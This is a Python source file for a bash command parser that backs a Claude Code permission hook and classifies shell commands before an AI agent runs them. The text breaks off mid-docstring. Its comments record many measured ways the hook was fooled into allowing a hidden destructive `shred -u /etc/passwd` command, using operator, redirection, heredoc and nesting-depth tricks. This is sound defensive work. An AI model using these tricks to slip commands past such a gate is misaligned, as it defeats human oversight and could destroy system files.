#!/usr/bin/env python3
"""
Bash Command Parser for Claude Code PreToolUse Hook

Parses compound bash commands, splitting on operators while respecting:
- Quotes (don't split on operators inside quotes)
- Escapes (handle backslash escaping)
- Environment variables (strip leading KEY=VALUE assignments)
- Redirections (ignore >, >>, 2>&1, etc.)
"""

import re
from typing import List, Optional, Tuple


class BashCommandParser:
    """Parse and split compound bash commands"""

    # Operators that separate commands
    # Note: an unquoted newline IS a command separator (treated like ';').
    # Escaped/continuation newlines, quoted newlines, heredoc bodies, and
    # command-substitution newlines are handled specially and do NOT split.
    #
    # A bare `&` is a command separator too — `cmd1 & cmd2` backgrounds `cmd1`
    # and runs `cmd2`, and BOTH execute. Omitting it (task 31) made the parser
    # return one sub-command headed by `cmd1`, so everything after the `&` was
    # never classified against any pattern: `true & <anything>` allowed. The
    # three shapes where `&` is NOT a separator are handled in _check_operator,
    # which matches `&&` and every redirection form that carries a `&` (`&>`,
    # `&>>`, `2>&1`, `>&`, `<&`, `1>&2`) BEFORE the lone `&` can be seen, and by
    # the quote/heredoc/case-pattern state machine in _tokenize_with_quotes,
    # which never reaches the operator check for a `&` that is data.
    OPERATORS = ['&&', '||', '|', ';', '&']

    # Redirection operators (NOT command separators)
    #
    # `>|` is bash's noclobber-override write (GREATER_BAR). It was absent from
    # both this table and the _check_operator scan until task 32 round 4, so it
    # lexed as REDIRECT `>` plus a SPURIOUS OP `|` — and an OP reopens
    # reserved-word position, which handed `echo hi >| [[ ; shred … ]]` a `[[`
    # that suppressed the `;`. See BASH_OPERATOR_TOKENS below: the fix is not
    # "add `>|`", it is "stop guessing at bash's lexer".
    REDIRECTIONS = ['>', '>>', '<', '<>', '<<', '<<-', '<<<', '>|',
                    '2>&1', '2>', '&>', '&>>', '1>&2', '2>>', '<&', '>&']

    # Redirections whose argument is STILL IN THE TOKEN STREAM when the
    # redirect is emitted, so `_split_on_operators` must drop one more token.
    #
    # `<<` and `<<-` are absent DELIBERATELY. The heredoc branch of
    # `_tokenize_with_quotes` consumes the delimiter word itself before it
    # emits `REDIRECT '<<'`, so listing them here dropped a SECOND word — the
    # command name. `<<EOF shred git status` was reported as `git status` and
    # auto-allowed while bash ran `shred git status` (task 32 round 5, item 1;
    # pre-existing for `<<`, and a round-4 regression for `<<-`, which round 4
    # taught the tokenizer to recognize without removing it from this table).
    # A bare `<<` with no delimiter never enters that branch and reaches the
    # operator scan instead — but it has no operand either (`cat << ;` is a
    # bash syntax error), so it must not skip a token in that shape either.
    #
    # `<<<` stays: the here-string is emitted by the operator scan with its
    # word operand untouched, so that operand really is the next token.
    REDIRECTIONS_WITH_ARG = ['>', '>>', '<', '<>', '<<<', '>|',
                             '2>', '&>', '&>>', '2>>']

    # Redirections that don't take an argument.
    # `>&` is here for its fd-duplication reading ONLY (`>&2`, `>&-`, `n>&m`).
    # Its other reading, `>& FILE`, is an exact synonym for `&> FILE` and is
    # normalized to that spelling by _check_operator, so it never reaches this
    # table with a path operand — see _is_bare_amp_write_redirect (task 32).
    REDIRECTIONS_NO_ARG = ['2>&1', '1>&2', '<&', '>&']

    # Redirections whose OPERAND WORD is still in the token stream when the
    # redirect is emitted, so `_split_on_operators` must drop the next token.
    #
    # That is REDIRECTIONS_WITH_ARG (path operands) PLUS the two fd-duplication
    # forms, whose operand is an fd number or `-` rather than a path. bash
    # consumes that word either way. Leaving it in the stream made it an extra
    # ARGUMENT in argument position — harmless, and pinned that way for three
    # rounds — but at COMMAND-START position it becomes the sub-command HEAD:
    # `printf A ; <&1 shred -u /etc/passwd` was reported as
    # `1 shred -u /etc/passwd`, so the head was `1` and the real command was
    # never classified (task 32 round 5, item 6). The fused spellings `2>&1`
    # and `1>&2` are matched WHOLE and carry no separate operand token, so they
    # are absent here.
    #
    # Not the LEADING fd word: `cmd 3>&1` still reports `cmd 3`. That is a
    # different defect with its own task; see task 32 §11.10.
    REDIRECTIONS_CONSUMING_A_WORD = REDIRECTIONS_WITH_ARG + ['<&', '>&']

    # Words after which a NEW command may begin, so a `case` appearing right
    # after one is the `case` KEYWORD rather than an argument. Used to gate
    # case-statement recognition: mistaking an argument for the keyword would
    # make us drop the following tokens as pattern text, which could hide a real
    # command from validation. Terminators (`done`, `fi`, `esac`) are absent —
    # a command can only follow them after a separator, and a separator reopens
    # reserved-word position on its own.
    #
    # These are the ONLY words _at_reserved_word_position() lets a reserved word
    # be seen through, and only when the keyword was itself at reserved-word
    # position: measured, `> /tmp/z if [[ -f x ]]` is `if: command not found`,
    # so an `if` that is a redirect TARGET makes the `[[` after it an argument.
    CMD_POSITION_WORDS = frozenset({
        'if', 'then', 'elif', 'else', 'while', 'until', 'do', '{', '!', 'time',
        # Grouping openers. `( list )` and `{ list ; }` both begin a command
        # LIST, so the first word inside one is at command position — bash runs
        # `( [[ -f a && -f b ]] )` as ONE conditional, and without `(` here the
        # `[[` inside a subshell stopped being the reserved word and the `&&`
        # split it in two (task 32 round-2 MEDIUM). `{` was already listed.
        # Only the SPACE-SEPARATED `(` is seen: `(` is not a tokenizer
        # metacharacter here, so a glued `([[ … ]])` is the single word `([[`
        # and stays a (safe-direction) mis-parse — see task 32 §9.
        '(',
    })

    # Redirections that WRITE to their path operand (create/truncate/append, or
    # point stdout/stderr at a file). Pure reads (`<`, `<<`) are excluded: they
    # consume an existing file, they neither create nor overwrite one, so their
    # target needs no write-destination gating. `<>` opens for read AND write
    # and CREATES the file when absent, so it IS a write. The fd-dup forms in
    # REDIRECTIONS_NO_ARG carry no path and so are absent here too.
    #
    # `>|` writes exactly like `>` (it only overrides `noclobber`), and it is
    # here because measured bash creates the file for every spelling — `>|`,
    # `1>|`, `2>|`, `{v}>|`. Before round 4 all four returned NO write target.
    WRITE_REDIRECTIONS_WITH_ARG = ['>', '>>', '<>', '>|', '2>', '&>', '&>>', '2>>']

    # Hard cap on recursion into nested substitutions and arithmetic.
    #
    # CPython raises RecursionError at ~1000 frames, and `pretool_hook.main()`
    # wraps the whole decision in `except Exception: sys.exit(0)` — so a raise
    # is not a crash, it is NO DECISION, which Claude Code reads as "the hook
    # had nothing to say" and falls through to the normal permission flow with
    # the deny erased. Measured on the real hook path: `("$((" * 3000) +
    # "\nshred -u /etc/passwd"` exited 0 with no output (task 32 round 5,
    # item 5). Whether that blanket handler should fail CLOSED is
    # `tasks/34_nul_byte_fail_open.md`'s question, not this one's; this cap
    # only stops the raise.
    #
    # Past the cap the nested text stays glued to its enclosing WORD instead of
    # being re-parsed. Round 5 documented that as failing toward `ask` "never
    # toward allow", on the theory that the sub-command head becomes the glued,
    # unmatchable text. That was FALSE and round 6 measured it (task 32 §13,
    # blocker 1): the head is the ALLOWLISTED WORD IN FRONT of the substitution,
    # not the glued text, so the whole command was ALLOWED —
    #
    #     echo A $($($(... 65 deep ...  shred -u /etc/passwd  ...)))
    #         depth 64 -> deny   ['echo A', 'shred -u /etc/passwd']
    #         depth 65 -> ALLOW  ['echo A']          <- the truncation
    #         HEAD     -> deny
    #         bash     -> runs the payload
    #
    # — and an explicit `allow` is WORSE than the RecursionError it replaced,
    # because a fail-open at least falls through to the native prompt. Every
    # carrier reached it: `$(…)`, `` `…` ``, `<(…)`, `$((…))`, and the
    # write-target gate.
    #
    # So truncation is no longer silent. Each of the three gates that refuses
    # to recurse REPORTS that refusal, and the reported thing is unmatchable,
    # so the head that decides is the truncation itself rather than whatever
    # allowlisted word happens to precede it:
    #
    #   parse_with_offsets   appends TRUNCATED_SUBSTITUTION_COMMAND as a
    #                        sub-command  (covers `$(…)`, `` `…` ``, `<(…)`)
    #   _scan_arith          forwards it as a nested CMD_SUBST, because
    #                        arithmetic nesting grows depth inside the
    #                        TOKENIZER while parse_with_offsets is still at
    #                        depth 0  (covers `$((…))`)
    #   _scan_write_targets  appends TRUNCATED_SUBSTITUTION_TARGET, an
    #                        unresolvable path, so the write-destination gate
    #                        refuses to vouch for a redirect it could not see
    #
    # The cost is a prompt on nesting deeper than the cap that is entirely
    # benign — measured, `echo A $(… 70 deep … echo hi …)` is `ask` here and
    # `allow` at HEAD. Real commands nest a handful deep; 64 is far above
    # anything a human writes and far below the frame limit (each level costs
    # 2-3 frames).
    MAX_SUBSTITUTION_DEPTH = 64

    # What a gate reports when it declines to recurse past MAX_SUBSTITUTION_DEPTH.
    #
    # Both are deliberately UNMATCHABLE rather than merely unusual. The
    # sub-command spelling carries no shell metacharacter, so nothing
    # downstream can re-tokenize it into something with a friendlier head, it
    # cannot be peeled away by _reduce_to_effective_command as a control prefix
    # or an env assignment, and it is not a SAFE_BUILTINS token — so it reaches
    # the pattern lookup, matches no `Bash(<binary>:*)` an operator would ever
    # write, and the compound command falls to `ask`. The target spelling
    # begins with `$`, which `_is_redirect_target_allowed` already treats as an
    # unresolved expansion it will not vouch for.
    TRUNCATED_SUBSTITUTION_COMMAND = '__unparsed_nested_substitution__'
    TRUNCATED_SUBSTITUTION_TARGET = '$__unparsed_nested_substitution__'

    # bash's operator tokens, transcribed from the grammar rather than guessed.
    #
    # This is the `other_token_alist` of bash's parse.y (the two- and
    # three-character operators its lexer recognizes) plus the single-character
    # metacharacters that are operators on their own. It is the SPINE of
    # _check_operator: any operator missing from it is lexed as a shorter
    # prefix, the remainder is re-read, and a redirection can turn into a
    # separator — an `OP`, which reopens reserved-word position and lets a `[[`
    # swallow every separator after it. Three of task 32's doors were exactly
    # that shape (`&`, `>|`, `1>&`).
    #
    # Ordered LONGEST FIRST so the scan is a maximal munch, as bash's is.
    # Sorting by length is done here, once, rather than trusted to the order
    # someone happens to type the list in.
    #
    # Absent by design:
    # - `(` / `)`: the tokenizer treats them as ordinary word characters except
    #   inside a `case` pattern list, and `(` is instead listed in
    #   CMD_POSITION_WORDS. Making them operators here would re-split every
    #   `$(…)`-adjacent word; the grouping-paren handling in _normalize_command
    #   covers what we need.
    # - the fd-prefixed forms (`n>`, `{v}>`, `n>&m`): bash lexes the fd as a
    #   separate NUMBER/REDIR_WORD token, and so do we — see the fd-prefix
    #   branch in _tokenize_with_quotes. `2>&1` and `1>&2` are kept as FUSED
    #   entries below only because matching them whole avoids leaking the fd
    #   digit out as a phantom command word.
    BASH_OPERATOR_TOKENS = sorted(
        [
            # list terminators / control operators
            '&&', '||', '|&', ';;', ';&', ';;&', '|', ';', '&',
            # redirections
            '<', '>', '>>', '<<', '<<-', '<<<', '<&', '>&', '&>', '&>>',
            '<>', '>|',
        ],
        key=len, reverse=True)

    # Fused fd+operator spellings matched WHOLE, ahead of the table above.
    #
    # These are not bash operators — bash reads `2>&1` as NUMBER `2`, operator
    # `>&`, word `1`. We match them whole so the fd digit never reaches the
    # word buffer: as a leading token a stray `2` becomes the head of a
    # sub-command (the `n>&-` residual recorded in task 32 §10.9). Matching
    # them here is a narrowing of that residual, not a model of bash.
    FUSED_FD_OPERATORS = ['2>&1', '1>&2']

    def __init__(self):
        """Initialize parser"""
        pass

    def parse_compound_command(self, command: str) -> List[str]:
        """
        Split compound command into individual sub-commands

        Args:
            command: Full bash command (may contain pipes, &&, etc.)

        Returns:
            List of normalized sub-commands

        Examples:
            "git status" → ["git status"]
            "git diff | head -100" → ["git diff", "head -100"]
            "GIT_PAGER=cat git diff" → ["git diff"]
            "npm install && npm test" → ["npm install", "npm test"]
        """
        return [cmd for cmd, _offset in self.parse_with_offsets(command)]

    def parse_with_offsets(self, command: str,
                           _depth: int = 0) -> List[Tuple[str, int]]:
        """
        Like parse_compound_command, but pairs each sub-command with the source
        offset at which its execution anchors. Callers that reason about
        execution order (e.g. "is this function defined before it is called?")
        need this; the bare string list discards it.

        The anchor offset is:
        - for a top-level sub-command: the source offset of its first token;
        - for a command extracted from a $()/`...` substitution: the source
          offset of the enclosing substitution. All commands inside a
          substitution share that anchor because they execute together, when
          the enclosing statement runs.

        Note the returned ORDER is top-level sub-commands first (in source
        order), then substitution-extracted commands appended — the same shape
        parse_compound_command has always produced. The offsets are what convey
        true source order; do not infer it from list position.

        `_depth` is internal: it counts how many substitutions deep this call
        is, and is capped at MAX_SUBSTITUTION_DEPTH so a pathological nesting
        cannot raise RecursionError out of the hook — see that constant.
        """
        if not command or not command.strip():
            return []

        # Tokenize the command
        tokens = self._tokenize_with_quotes(command, _depth=_depth)

        # Split on operators
        command_groups = self._split_on_operators(tokens)

        # Normalize each group (strip env vars, clean whitespace)
        result = []
        for group in command_groups:
            normalized = self._normalize_command(group)
            if normalized:
                result.append((normalized, group[0][2]))

        # Also extract commands from command substitutions recursively. Each
        # extracted command anchors at the substitution's own source offset, so
        # a function defined AFTER the substitution cannot appear to precede a
        # call made INSIDE it.
        if _depth < self.MAX_SUBSTITUTION_DEPTH:
            for token_type, token_value, token_offset in tokens:
                if token_type == 'CMD_SUBST' and token_value.strip():
                    # Recursively parse the content of command substitutions
                    for sub_cmd, _rel_offset in self.parse_with_offsets(
                            token_value, _depth=_depth + 1):
                        result.append((sub_cmd, token_offset))
        elif any(t_type == 'CMD_SUBST' and t_val.strip()
                 for t_type, t_val, _t_off in tokens):
            # At the cap we refuse to look any further, and we SAY SO. Silently
            # returning only what this level parsed left the decision to the
            # allowlisted head in front of the substitution — an explicit
            # `allow` on a payload HEAD denied. See MAX_SUBSTITUTION_DEPTH.
            #
            # Conditional on there actually being a substitution here, so a
            # nesting that BOTTOMS OUT exactly at the cap still parses cleanly
            # and costs no prompt. That test is complete: the one carrier whose
            # depth grows inside the tokenizer is arithmetic, and `_scan_arith`
            # forwards its own refusal AS a CMD_SUBST token, so it is visible
            # right here.
            #
            # Offset 0 anchors the sentinel at the start of this level, the
            # conservative end for the function-definition ordering rule; the
            # caller overwrites it with the enclosing substitution's offset
            # anyway.
            result.append((self.TRUNCATED_SUBSTITUTION_COMMAND, 0))

        return result

    # bash's METACHARACTERS, the unquoted characters that end a WORD — and so
    # end a heredoc delimiter word. Transcribed from bash's `shell_meta_chars`
    # plus the blanks; `\n` is included because a delimiter word cannot span a
    # line. Everything else is an ordinary word character: `-`, `.`, `:`, `=`,
    # `#`, `!`, `*`, `$`, `{`, `}` and the rest all belong to the delimiter.
    HEREDOC_DELIM_TERMINATORS = frozenset(' \t\n|&;()<>')

    @staticmethod
    def _heredoc_line_starts(command: str, pos: int,
                             strip_tabs: bool) -> List[int]:
        """Offsets in the terminator line at `pos` a delimiter may start at.

        `[pos]` for `<<`. For `<<-` it is `[pos, pos_past_leading_tabs]` — the
        RAW line FIRST, then the tab-stripped one — because bash accepts
        EITHER, and the three `closes_heredoc` copies must ask the same
        question.

        Round 7 asked only the second. That is right for the ordinary
        delimiter, but `<<-` does not stop a delimiter from BEGINNING with a
        tab: quote removal and escaping make one an ordinary word character, so
        `<<-'\\tEOF'`, `<<-"\\tEOF"` and `<<-\\\\\\tEOF` all have the delimiter
        `\\tEOF`. Against such a delimiter a tab-stripped candidate can NEVER
        match — stripping removes the very tab the delimiter starts with — so
        the body never closed and swallowed the rest of the script:
        `cat <<-'\\tEOF' / body / \\tEOF / shred -u /etc/passwd` went from
        HEAD's `deny` to `allow` while bash ran the payload.

        The union is bash's own rule, not a widened guess. Measured on bash
        5.3.9 over {11 delimiter words} x {16 candidate lines} x {`<<`,`<<-`}
        = 352 cells, `line == delim or (<<- and lstrip_tabs(line) == delim)`
        matched in 352/352:

            operator  delimiter   line        closes?
            `<<-`     `\\tEOF`     `\\tEOF`     YES  (raw)
            `<<-`     `\\tEOF`     `EOF`       no   (stripping is not undone)
            `<<-`     `\\tEOF`     `\\t\\tEOF`   no
            `<<-`     `\\t\\tEOF`   `\\t\\tEOF`   YES  (raw)
            `<<-`     `\\t\\tEOF`   `\\tEOF`     no
            `<<-`     ` EOF`      `\\t EOF`    YES  (stripped)
            `<<-`     `EOF`       `\\t\\tEOF`   YES  (stripped)
            `<<-`     `EOF`       ` EOF`      no   (only TABS are stripped)
            `<<`      `\\tEOF`     `\\tEOF`     YES  (raw)
            `<<`      `\\tEOF`     `EOF`       no

        Adding the raw offset cannot disturb any delimiter that does not begin
        with a tab: for those, a raw match implies a stripped match (nothing
        was stripped), so the two offsets answer identically. And when the
        delimiter DOES begin with a tab the stripped offset can never match, so
        the two are mutually exclusive and the order is immaterial. The change
        is therefore confined, provably, to tab-leading delimiters under `<<-`.
        Task 32 §15, blocker 2.
        """
        starts = [pos]
        if strip_tabs:
            j = pos
            n = len(command)
            while j < n and command[j] == '\t':
                j += 1
            if j != pos:
                starts.append(j)
        return starts

    @staticmethod
    def _parse_heredoc_delim(command: str,
                             i: int) -> Tuple[Optional[str], int,
                                              bool, bool]:
        """
        Parse a heredoc operator at `command[i:]` (caller guarantees
        `command[i:i+2] == '<<'`).

        Returns `(delimiter, j, strip_tabs, declined)` where `j` is the index
        just past the delimiter token and `strip_tabs` is True for the `<<-`
        spelling, whose terminator line may be indented with TABS.

        Returns `(None, i, False, declined)` when this is not a heredoc that
        introduces a body: a `<<<` here-string, a bare `<<` with no delimiter
        word, a delimiter that is empty, unterminated, or spans a newline, or
        one that embeds a command substitution or an ANSI-C / locale
        translation quote (see below). bash could never match a terminator
        line for most of those, and refusing the heredoc leaves the text
        after it to be tokenized as commands.

        `declined` separates the two kinds of `None`. It is True only for a
        delimiter this scanner RECOGNISED and refused to model — `$(`, a
        backtick, `$'`, `$"` — the four spellings for which bash DOES open a
        heredoc body with a delimiter we decline to compute. It is False for
        every other `None`, which is a heredoc bash does not open either (a
        here-string, a syntax error, an unterminated quote).

        The distinction is load-bearing, not documentation. "Refusing fails
        toward `ask`" was true only of the residual corpus that happened to be
        measured: refusing hands the BODY to the tokenizer, and a first body
        line that opens another swallowing construct (`cat <<Z`, `echo 'x`)
        eats the real terminator AND the payload, leaving a split that is
        entirely allowlisted — an `allow`, not an `ask`. Round 9's callers
        therefore report the refusal with
        `TRUNCATED_SUBSTITUTION_COMMAND`, which makes "a refusal can never
        reach `allow`" true BY CONSTRUCTION rather than by corpus shape. Task
        32 §16.

        This is the ONE implementation of the rule: `_tokenize_with_quotes`,
        `_scan_paren_subst` and `_scan_backtick` all call it. Round 4 taught
        `<<-` to a hand-copied duplicate inside the tokenizer and left the two
        scanners on the old reading; a single function cannot drift that way.

        THE DELIMITER IS A WHOLE WORD, WITH QUOTE REMOVAL. Rounds 4-6 scanned
        the unquoted spelling as `[A-Za-z0-9_]*` and the quoted spelling as
        "verbatim up to the closing quote, and stop there". Both are wrong, and
        together they stranded the tail of every delimiter that is not purely
        alphanumeric: `<<EOF-1` yielded `EOF` and left `-1` behind, `<<'E'OF`
        yielded `E` and left `OF` behind. Measured on bash 5.3.9, one row per
        spelling, `cat <<D / body / <line> / echo TAIL`:

            spelling      bash's delimiter   ordinary word chars / quote removal
            `<<EOF-1`     `EOF-1`            `-` is not a metacharacter
            `<<EOF.txt`   `EOF.txt`          nor is `.`
            `<<E:F`       `E:F`              nor `:`, `=`, `#`, `!`, `*`
            `<<${X}`      `${X}`             NOT expanded, and `{`/`}` are words
            `<<$X`        `$X`               nor is a bare `$` expanded
            `<<E'O'F`     `EOF`              quote removal, mid-word
            `<<'E'OF`     `EOF`              quote removal, leading quote
            `<<"E\\$F"`    `E$F`              `\\` escapes `$` inside `"`
            `<<"E\\OF"`    `E\\OF`             but is LITERAL before anything else
            `<<'E\\OF'`    `E\\OF`             and always literal inside `'`
            `<<E\\ F`      `E F`              an escaped blank joins the word
            `<<E\\<nl>F`   `EF`               `\\`+newline is a line continuation
            `<<EOF\\r`     `EOF\\r`            CR is an ordinary character
            `<<EOF;`      `EOF`              `;`, `|`, `&`, `<`, `>`, `(`, `)`
                                             and blanks END the word

        Truncating the word was masked for two rounds because the terminator
        comparison in `_scan_paren_subst`/`_scan_backtick` is a PREFIX match:
        the truncated `EOF` still prefix-matched the real terminator line
        `EOF-1`, so the body closed anyway. Round 6 made the TOKENIZER's
        comparison exact (correctly — see `_tokenize_with_quotes.closes_heredoc`)
        and the mask came off: the body never closed, and everything after it
        was swallowed. `cat <<EOF-1 / body / EOF-1 / shred -u /etc/passwd` went
        from HEAD's `deny ['cat -1', 'shred -u /etc/passwd']` to
        `allow ['cat -1']` while bash ran the payload. 34 ASCII spellings flipped
        that way, CRLF line endings among them. See task 32 §14.

        `$(`, `$((` and a backtick are the one construct bash absorbs into the
        word THROUGH a metacharacter (`cat <<$(echo E)` has the literal,
        unexpanded delimiter `$(echo E)`). Rather than grow a second nested
        scanner here, this refuses the heredoc outright — and REPORTS the
        refusal, which is what keeps it from reaching `allow`; see `declined`
        above and the refusal sites below.

        Two claims rounds 7-8 made about that refusal were wrong, and are
        corrected here rather than deleted, because each one hid a blocker:

        - "it is exactly what the alnum scan already did, so it is not a new
          answer". True only at the START of the word. Measured on HEAD's own
          scanner, `<<$(echo E)` and `` <<`echo E` `` did come back empty and
          were refused — but `<<E$(echo x)F` came back `E`, a NON-EMPTY
          delimiter, so HEAD opened a heredoc where this refuses one. Mid-word
          it IS a new answer.
        - "it fails toward `ask`". Not by itself it does not: refusing hands
          the BODY to the tokenizer, and a body line that opens another
          swallowing construct eats the terminator and the payload, leaving an
          all-allowlisted split — `allow`. That is why the refusal is now
          reported. See the refusal sites below.

        `$'…'` and `$"…"` are refused on the same terms and for a sharper
        reason: bash's quote removal takes the `$` AWAY (`<<$'EOF'` has the
        delimiter `EOF`), so a scanner that treats `$` as an ordinary word
        character and then opens a quote produces `$EOF` — a delimiter no
        terminator line can ever equal. See the refusal site below for the
        measured table and why decoding them is not worth it.
        """
        # `<<<` is a here-string, not a heredoc: it has no multi-line body.
        if command[i:i+3] == '<<<':
            return None, i, False, False
        n = len(command)
        j = i + 2
        # `<<-EOF` / `<<- EOF`: the `-` belongs to the OPERATOR, not to the
        # delimiter, and it is what makes bash strip leading TABS from the
        # terminator line. It counts only GLUED to the `<<` — `<< -EOF` is a
        # delimiter that starts with a dash, not the tab-stripping spelling.
        strip_tabs = False
        if j < n and command[j] == '-':
            strip_tabs = True
            j += 1
        while j < n and command[j] in (' ', '\t'):
            j += 1
        # One word scanner for the quoted and unquoted spellings alike. Folding
        # them is what fixes `<<'E'OF`: a separate leading-quote branch returns
        # at the closing quote and can never see the `OF` glued after it.
        parts = []
        quote = None  # None, "'", or '"'
        while j < n:
            c = command[j]
            if quote == "'":
                if c == '\n':
                    # A quoted delimiter cannot span a line; bash would never
                    # match a terminator for it. Refuse (safe direction).
                    return None, i, False, False
                if c == "'":
                    quote = None
                else:
                    parts.append(c)
                j += 1
                continue
            if quote == '"':
                if c == '\n':
                    return None, i, False, False
                if c == '"':
                    quote = None
                    j += 1
                    continue
                if c == '\\' and j + 1 < n and command[j + 1] in '$`"\\':
                    parts.append(command[j + 1])
                    j += 2
                    continue
                if c == '\\' and j + 1 < n and command[j + 1] == '\n':
                    j += 2  # line continuation, removed
                    continue
                # Inside `"` a backslash is LITERAL before anything else.
                parts.append(c)
                j += 1
                continue
            if c in ('"', "'"):
                quote = c
                j += 1
                continue
            if c == '\\':
                if j + 1 >= n:
                    parts.append(c)  # trailing `\`: bash keeps it literally
                    j += 1
                    continue
                if command[j + 1] == '\n':
                    j += 2  # line continuation, removed
                    continue
                parts.append(command[j + 1])
                j += 2
                continue
            if c == '`' or command[j:j+2] == '$(':
                # bash absorbs a whole substitution into the word; we decline —
                # and we SAY SO, so the caller can report the refusal.
                return None, i, False, True
            if command[j:j+2] in ("$'", '$"'):
                # ANSI-C quoting (`$'…'`) and locale translation (`$"…"`).
                # bash removes the `$` ALONG WITH the quotes, so the delimiter
                # of `<<$'EOF'` is `EOF`, not `$EOF`. Round 7 opened the quote
                # at the `'` but had already appended the `$` as an ordinary
                # word character, and the exact-line terminator match then
                # never fired: `cat <<$'EOF' / body / EOF / shred -u
                # /etc/passwd` went from HEAD's `deny` to `allow` while bash
                # ran the payload. Measured on bash 5.3.9 off its
                # `wanted `X'` warning:
                #
                #     spelling      bash's delimiter   round 7's
                #     `<<$'EOF'`    `EOF`              `$EOF`
                #     `<<$"EOF"`    `EOF`              `$EOF`
                #     `<<E$'x'F`    `ExF`              `E$xF`
                #     `<<$''E`      `E`                `$E`
                #
                # We REFUSE rather than implement the quoting, for the same
                # reason as `$(` above — and, since round 9, we SAY SO, which
                # is what stops the refusal reaching `allow`.
                #
                # Round 8 justified the refusal as "exactly what HEAD's alnum
                # scan already answered, so it is not a new answer". Measured
                # on HEAD's own scanner, that holds only at the START of the
                # word:
                #
                #     spelling        HEAD        round 7   round 8/9
                #     `<<$'EOF'`      None        `$EOF`    None (refused)
                #     `<<$"EOF"`      None        `$EOF`    None (refused)
                #     `<<$''E`        None        `$E`      None (refused)
                #     `<<E$'x'F`      `E`         `E$xF`    None (refused)
                #     `<<E$"x"F`      `E`         `E$xF`    None (refused)
                #     `<<E$'x'F.txt`  `E`         `E$xF...` None (refused)
                #
                # The mid-word rows are a NEW answer: HEAD came back with a
                # non-empty `E` and opened a heredoc. So this refusal is a
                # deliberate loss of precision there, not a restatement of
                # HEAD, and the reported marker is what keeps the loss on the
                # `ask` side of the line.
                #
                # Decoding `$'…'` properly means the whole ANSI-C escape set
                # (`\n \t \\ \' \xHH \0nnn \uHHHH \cX` …). `$"…"` is not
                # merely harder — it is IMPOSSIBLE from the script text.
                # Measured with a real gettext catalogue (`msgid "EOF"` ->
                # `msgstr "ZZTOP"`, `TEXTDOMAIN=btest`), bash's own warning
                # reads ``wanted `ZZTOP'``: the delimiter is the TRANSLATED
                # string, so it is a function of the locale's message
                # catalogue, not of the command. Neither belongs in a word
                # scanner. Task 32 §15 blocker 1, §16.
                #
                # An ESCAPED `$` is not this: `<<\$'EOF'` is handled by the
                # backslash branch above, which consumes `\$` before `j` ever
                # points at the `$`, and yields bash's `$EOF`.
                return None, i, False, True
            if c in BashCommandParser.HEREDOC_DELIM_TERMINATORS:
                break
            parts.append(c)
            j += 1
        if quote is not None:
            return None, i, False, False  # unterminated quote
        delimiter = ''.join(parts)
        if not delimiter:
            return None, i, False, False
        return delimiter, j, strip_tabs, False

    def _scan_paren_subst(self, command: str, start: int) -> Tuple[str, int]:
        """
        Scan a `$(...)` command substitution beginning at `start` (the `$`).

        Returns (content, end) where `content` is the text between `$(` and the
        matching `)`, and `end` is the index just past that `)`. Quote state is
        tracked so a `)` inside a quoted string (e.g. a regex `[^)]`) does not
        close the substitution prematurely, and nested `$(...)` raise the depth.

        A heredoc body inside the substitution (`$(cat <<'EOF' ... EOF)`) is
        skipped wholesale: its text is data, not shell, so an apostrophe
        (`node's`), a stray quote, or an unbalanced paren in the body must not
        flip quote state or move the depth count, which would mislocate the
        closing `)` and leak the tail back out as bogus sub-commands.
        """
        depth = 1
        i = start + 2
        quote = None  # None, "'", or '"'
        heredoc_delim = None  # active heredoc delimiter, once `<<DELIM` is seen
        heredoc_seen_nl = False  # body begins after the first newline past `<<`
        heredoc_strip = False  # `<<-`: the terminator line may be tab-indented
        n = len(command)

        def closes_heredoc(pos):
            """Index just past the terminator if the line at `pos` BEGINS with
            it, else None. `<<-` strips leading TABS — see
            `_parse_heredoc_delim`.

            A PREFIX match, deliberately, and NOT the exact-line rule the
            top-level tokenizer uses. This function serves bash's `$(...)`
            EXTENT scanner, and bash's own extent scanner is prefix-matched
            while its heredoc READER is exact. Measured on bash 5.3.9, one
            variable per row, `x=$(cat <<EOF / <body> / EOF / printf INNER / )`:

                body line   substitution ends at          heredoc body
                `EOF )`     the `)` ON THAT LINE          unterminated
                `EOFY )`    the `)` ON THAT LINE          unterminated
                `EOF)`      the `)` ON THAT LINE          unterminated
                `XEOF )`    the final `)`                 `XEOF )`
                ` EOF )`    the final `)`                 ` EOF )`

            So a line beginning with the delimiter ends the body for the
            purpose of finding the closing paren, and a leading space or any
            other prefix does not. Round 6 briefly made this exact and MEASURED
            the cost: `echo $(cat <<EOF\nEOF )\nEOF\nprintf T\n) ; ls` then
            hid the `EOF` that bash really runs. See task 32 §13.

            Under `<<-` the RAW line is tried before the tab-stripped one, the
            same union the tokenizer's copy uses — see `_heredoc_line_starts`.
            """
            for k in BashCommandParser._heredoc_line_starts(
                    command, pos, heredoc_strip):
                if command[k:k+len(heredoc_delim)] == heredoc_delim:
                    return k + len(heredoc_delim)
            return None

        while i < n and depth > 0:
            c = command[i]
            # Inside a heredoc body: skip every char until a line equal to the
            # delimiter, mirroring the top-level tokenizer's body handling.
            if heredoc_delim is not None and heredoc_seen_nl:
                if c == '\n':
                    i += 1
                    end = closes_heredoc(i)
                    if end is not None:
                        i = end
                        heredoc_delim = None
                    continue
                i += 1
                continue
            if c == '\\' and quote != "'" and i + 1 < n:
                i += 2
                continue
            if quote:
                if c == quote:
                    quote = None
                i += 1
                continue
            if c in ('"', "'"):
                quote = c
                i += 1
                continue
            if heredoc_delim is None and command[i:i+2] == '<<':
                # The refusal flag is for the TOKENIZER, which is the copy
                # that emits sub-commands; here it only matters where the
                # substitution ENDS, and a refused heredoc is not tracked
                # either way. The body still reaches the tokenizer through this
                # substitution's own CMD_SUBST token, which is where the
                # refusal gets reported.
                delim, j, heredoc_strip, _declined = \
                    self._parse_heredoc_delim(command, i)
                if delim is not None:
                    heredoc_delim = delim
                    heredoc_seen_nl = False
                    i = j
                    continue
            if c == '\n' and heredoc_delim is not None and not heredoc_seen_nl:
                heredoc_seen_nl = True
                i += 1
                # The FIRST body line is a candidate terminator too — see the
                # tokenizer's newline handler (task 32 round 5, item 3).
                end = closes_heredoc(i)
                if end is not None:
                    i = end
                    heredoc_delim = None
                continue
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
            i += 1
        return command[start + 2:i - 1], i

    def _scan_backtick(self, command: str, start: int) -> Tuple[str, int]:
        """
        Scan a `` `...` `` command substitution beginning at `start` (the
        opening backtick).

        Returns (content, end) where `content` is the text between the
        backticks and `end` is the index just past the closing backtick. A
        backslash escapes the next character (including an embedded backtick).

